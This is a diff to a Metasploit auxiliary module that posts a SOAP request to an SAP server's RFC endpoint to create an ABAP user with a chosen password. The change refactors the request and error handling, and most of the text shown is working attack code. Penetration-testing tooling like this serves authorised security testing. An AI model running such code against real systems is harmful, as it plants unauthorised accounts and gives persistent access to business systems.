@@ -2,7 +2,7 @@
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+#   http://metasploit.com/framework/
 ##
 
 ##
@@ -68,42 +68,46 @@ class Metasploit4 < Msf::Auxiliary
 		data << '</n1:SUSR_RFC_USER_INTERFACE>'
 		data << '</env:Body>'
 		data << '</env:Envelope>'
-		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
+
 		begin
-			print_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}'")
-			res = send_request_raw({
+			vprint_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}'")
+			res = send_request_cgi({
 				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
 				'method' => 'POST',
 				'data' => data,
-				'headers'  =>{
-					'Content-Length' => data.size.to_s,
-					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-					'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-					'Authorization' => 'Basic ' + user_pass,
-					'Content-Type' => 'text/xml; charset=UTF-8'}
-					}, 45)
-				if res and res.code == 200
-					if res.body =~ /<h1>Logon failed<\/h1>/
-						print_error("[SAP] #{ip}:#{rport} - Logon failed")
-						return
-					elsif res.body =~ /faultstring/
-						error = []
-						error = [ res.body.scan(%r{(.*?)}) ]
-						print_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
-						return
-					else
-						print_good("[SAP] #{ip}:#{rport} - User '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}' created")
-						return
-					end
+				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+				'ctype' => 'text/xml; charset=UTF-8',
+				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+				'headers'  =>
+					{
+						'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+					}
+				})
+			if res and res.code == 200
+				if res.body =~ /<h1>Logon failed<\/h1>/
+					vprint_error("[SAP] #{ip}:#{rport} - Logon failed")
+					return
+				elsif res.body =~ /faultstring/
+					error = []
+					error = [ res.body.scan(%r{(.*?)}) ]
+					vprint_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
+					return
 				else
-					print_error("[SAP] #{ip}:#{rport} - Unknown error")
-					print_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
-					print_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
+					print_good("[SAP] #{ip}:#{rport} - User '#{datastore['ABAP_USER']}' with password '#{datastore['ABAP_PASSWORD']}' created")
 					return
 				end
-			rescue ::Rex::ConnectionError
-				print_error("[SAP] #{rhost}:#{rport} - Unable to connect")
+			elsif res and res.code == 500 and res.body =~ /USER_ALLREADY_EXISTS/
+				vprint_error("[SAP] #{ip}:#{rport} - user already exists")
+				return
+			else
+				vprint_error("[SAP] #{ip}:#{rport} - Unknown error")
+				vprint_error("[SAP] #{ip}:#{rport} - Error code: " + res.code) if res
+				vprint_error("[SAP] #{ip}:#{rport} - Error message: " + res.message) if res
 				return
 			end
+		rescue ::Rex::ConnectionError
+			vprint_error("[SAP] #{rhost}:#{rport} - Unable to connect")
+			return
 		end
 	end
+end
